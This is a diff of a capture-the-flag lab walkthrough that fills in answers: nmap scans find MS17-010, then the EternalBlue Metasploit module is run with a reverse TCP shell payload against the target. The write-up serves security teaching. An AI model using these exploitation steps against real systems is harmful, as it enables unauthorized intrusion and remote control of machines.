@@ -1,46 +1,85 @@
 ## Recon
 
 <details>
-<summary> Scan the machine. </summary>
-
-Any folded content here. It requires an empty line just above it.
-
-</details>
-
-<details>
 <summary> How many ports are open with a port number under 1000? </summary>
+  <p></p>
 
-Any folded content here. It requires an empty line just above it.
+____________________________________________________________________________________________________________________  
+  
+As we are specifying only ports under 1000 we use the following command:
+  
+``` nmap [ip] -p 0-1000 ```
 
+As seen below, running this command exposes 3 open ports:
+  
+![image](https://user-images.githubusercontent.com/66912443/186659494-ca27127c-ef59-4279-8c78-4a66e22f1cd9.png)
+
+____________________________________________________________________________________________________________________  
+  
 </details>
 
 <details>
 <summary> What is this machine vulnerable to? </summary>
+<p></p>
 
-Any folded content here. It requires an empty line just above it.
+____________________________________________________________________________________________________________________ 
 
+The script "vuln" is a CVE detection script that helps discover vulnerabilities in the scanned network. It can be activated with the following command:
+  
+``` nmap [ip] --script vuln ```
+  
+As seen below it has identified the machine is vulnerable to "ms17-010"
+  
+![image](https://user-images.githubusercontent.com/66912443/186661668-94728fae-8558-4642-81a8-3cb717ee4798.png)
+
+____________________________________________________________________________________________________________________  
 </details>
 
 ## Gain Access
 
 <details>
 <summary> Find the exploitation code we will run against the machine. What is the full path of the code? </summary>
+  <p></p>
+  
+____________________________________________________________________________________________________________________ 
+  
+Rapid7 is a great tool for finding vulnerabilities and their uses along with sometimes instructions on how to complete the exploit yourself. Using rapid7.com's Vulnerability and Exploit Database, this vulnerability can be seen in more detail:
+  
+``` https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/ ```
+  
+Talking about instructions on how to complete the exploit yourself, at the bottom of the page the first line of code identifies the exploitation code needed to run against the machine!
+  
+![image](https://user-images.githubusercontent.com/66912443/186663495-0312c1af-22e4-4549-bfbf-563dda2f2670.png)
 
-Any folded content here. It requires an empty line just above it.
-
+____________________________________________________________________________________________________________________  
 </details>
 
 <details>
 <summary> Show options and set the one required value. What is the name of this value? </summary>
+  <p></p>
 
-Any folded content here. It requires an empty line just above it.
+____________________________________________________________________________________________________________________   
+``` RHOSTS ``` is the one required value. This is because RHOSTS determines the ip address of the target.
 
+____________________________________________________________________________________________________________________   
+  
 </details>
 
 <details>
 <summary> With that done, run the exploit! </summary>
+ 
+____________________________________________________________________________________________________________________ 
 
-Any folded content here. It requires an empty line just above it.
+Before running the exploit, make sure to run the following command as by default it will load meterpreter:
+  
+``` set payload windows/x64/shell/reverse_tcp ```
+  
+Then simply type 'run' and let metaspolit do its thing! If done correctly you will be presented with something similar to the following:
+  
+![image](https://user-images.githubusercontent.com/66912443/186665440-c9ede66d-7bc3-4245-b47e-a56ceec67727.png)
+
+  
+____________________________________________________________________________________________________________________ 
 
 </details>
 
